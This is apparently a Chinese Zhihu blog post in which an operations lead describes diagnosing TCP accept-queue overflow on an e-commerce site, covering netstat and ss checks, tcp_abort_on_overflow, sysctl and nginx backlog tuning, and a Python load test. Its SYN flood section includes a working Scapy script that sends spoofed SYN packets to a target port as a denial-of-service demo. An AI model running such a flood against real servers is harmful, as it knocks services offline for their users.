# 记一次惊心的网站TCP队列问题排查经历 - 知乎
# 



> **作者：刘晓明，互联网公司运维技术负责人，拥有10年的互联网开发和运维经验。一直致力于运维工具的开发和运维专家服务的推进，赋能开发，提高效能。广告时间：最后给自己代个盐~~欢迎大家有空时翻下我牌子([知乎号：布道](https://www.zhihu.com/people/dockersky/columns) )，看看“[开发运维](https://zhuanlan.zhihu.com/idevops)”专栏的文章，希望多些关注和点赞是给作者最好的鼓励 ！**

## **问题描述：**
- 监控系统发现电商网站主页及其它页面间歇性的无法访问；
- 查看安全防护和网络流量、应用系统负载均正常；
- 系统重启后，能够暂时解决，但持续一段时间后间歇性问题再次出现。

**此时问题已经影响到整个网站的正常业务，我的那个心惊的呀，最主要报警系统没有任何报警，服务运行一切正常，瞬时背上的汗已经出来了。但还是要静心，来仔细寻找蛛丝马迹，来一步一步找问题。**

## **问题初步判断:**

**1. 检查dev 和 网卡设备层，是否有error和drop**

cat /proc/net/dev 和 ifconfig，分析在硬件和系统层，**未发现异常**

**2. 观察socket overflow 和 socket droped（如果应用处理全连接队列（accept queue）过慢 socket overflow，影响半连接队列(syn queue)溢出socket dropped）**

netstat -s |grep -i listen ，**发现SYN socket overflow****和 socket droped 急增加。**
![](https://pic4.zhimg.com/v2-9201b91a3fe4d5c0af141aad04d97b8f_b.jpg)![](data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='554' height='49'></svg>)
**3. 检查sysctl内核参数：backlog，somaxconn，file-max 和 应用程序的backlog**

ss -lnt查询，SEND-Q会取上述参数的最小值，**发现当时队列已经超过网站80端口和443端口默认值**
![](https://pic4.zhimg.com/v2-f7094e42d99835ba1f951159c7fae3cb_b.jpg)![](data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='424' height='31'></svg>)
**4. 检查 selinux 和NetworkManager 是否启用 ，禁用状态**

**5. 检查timestap ,reuse 启用，内核recycle是否启用，如果过NAT，禁用recycle**

**6. 抓包判断请求进来后应用处理的情况，是否收到SYN未响应情况。**
![](https://pic3.zhimg.com/v2-7b2df640f29c1b98c9e493028e5241aa_b.jpg)![](data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='554' height='69'></svg>)
## **深入分析问题：**

正常TCP建连接三次握手过程：
- 第一步：**客户端** 发送 syn 到 **服务端** 发起握手；
- 第二步：**服务端 **收到 syn后回复syn+ack给 **客户端**；
- 第三步： **客户端 **收到syn+ack后，回复 **服务端 **一个ack表示收到了 **服务端 **的syn+ack 。

从描述的情况来看，TCP建连接的时候全连接队列（accept队列）满了，尤其是描述中症状为了证明是这个原因。反复看了几次之后发现这个overflowed 一直在增加，那么可以明确的是server上全连接队列一定溢出了。

**接着查看溢出后，OS怎么处理：**

# cat /proc/sys/net/ipv4/tcp_abort_on_overflow

0

tcp_abort_on_overflow 为0表示如果三次握手第三步的时候全连接队列满了那么server扔掉client 发过来的ack（在server端认为连接还没建立起来）

为了证明客户端应用代码的异常跟全连接队列满有关系，我先把tcp_abort_on_overflow修改成 1，1表示第三步的时候如果全连接队列满了，server发送一个reset包给client，表示废掉这个握手过程和这个连接（本来在server端这个连接就还没建立起来）。

接着测试然后在web服务日志中异常中可以看到很多connection reset by peer的错误，到此证明客户端错误是这个原因导致的。

查看sysctl内核参数：backlog ，somaxconn，file-max 和  nginx的backlog配置参数，ss -ln取最小值，发现为128，此时resv-q已经在129 ，请求被丢弃。将上述参数修改，并进行优化：
- linux内核参进行优化：
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_max_syn_backlog = 16384
net.core.somaxconn = 16384
- nginx 配置参数优化：
backlog=32768;

利用python 多线程压测，并未发现新的问题：


```
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
url='https://www.wuage.com/'
response=requests.get(url)
soup=BeautifulSoup(response.text,'html.parser')
with ThreadPoolExecutor(20) as ex:
    for each_a_tag in soup.find_all('a'):
        try:
            ex.submit(requests.get,each_a_tag['href'])
        except Exception as err:
            print('return error msg:'+str(err))
```


## **理解TCP握手过程中建连接的流程和队列**
![](https://pic3.zhimg.com/v2-618e03b72dbc85d095e69fe1f525f9a6_b.jpg)![](data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='1024' height='747'></svg>)
如上图所示，这里有两个队列：syns queue(半连接队列）；accept queue（全连接队列）

三次握手中，server收到client的syn后，把相关信息放到半连接队列中，同时回复syn+ack给client，比如syn floods 攻击就是发生在这个阶段（下文会有详细介绍和Demo）。server收到client的ack，如果这时全连接队列没满，那么从半连接队列拿出相关信息放入到全连接队列中，否则按tcp_abort_on_overflow指示的执行。

这时如果全连接队列满了并且tcp_abort_on_overflow是0的话，server过一段时间再次发送syn+ack给client（也就是重新走握手的第二步），如果client超时等待比较短，就很容易异常了。

## **SYN Flood洪水攻击**

当前最流行的DoS（拒绝服务攻击）与DDoS（分布式拒绝服务攻击）的方式之一，这是一种利用TCP协议缺陷，导致被攻击服务器保持大量SYN_RECV状态的“半连接”，并且会重试默认5次回应第二个握手包，塞满TCP等待连接队列，资源耗尽（CPU满负荷或内存不足），让正常的业务请求连接不进来。用python实现一个SYN Flood攻击的Demo：


```
from concurrent.futures import ThreadPoolExecutor
from scapy.all import *
def synFlood(tgt,dPort):
    srcList = ['11.1.1.2','22.1.1.102','33.1.1.2',
               '125.130.5.199']
    for sPort in range(1024, 65535):
        index = random.randrange(4)
        ipLayer = IP(src=srcList[index], dst=tgt)
        tcpLayer = TCP(sport=sPort, dport=dPort,flags='S')
        packet = ipLayer/tcpLayer
        send(packet)

tgt = 'xxx.xxx.xxx.xxx'
print(tgt)
dPort = 443

with ThreadPoolExecutor(10000000) as ex:
    try:
        ex.submit(synFlood(tgt,dPort))
    except Exception as err:
        print('return error msg:' + str(err))
```


所以大家要对TCP半连接队列和全连接队列的问题很容易被忽视，但是又很关键，特别是对于一些短连接应用更容易爆发、出现问题后，从网络流量、cpu、线程、负载来看都比较正常，在用户端来看rt比较高，但是从服务器端的日志看rt又很短。如何避免在出现问题时手忙脚乱，建立起应急机机制，后续有机会写一下应急方面的文章。

**文章推荐：**
[布道：Bug引发事故，该不该追究责任？​zhuanlan.zhihu.com![图标](https://zhstatic.zhihu.com/assets/zhihu/editor/zhihu-card-default.svg)](https://zhuanlan.zhihu.com/p/31813148)



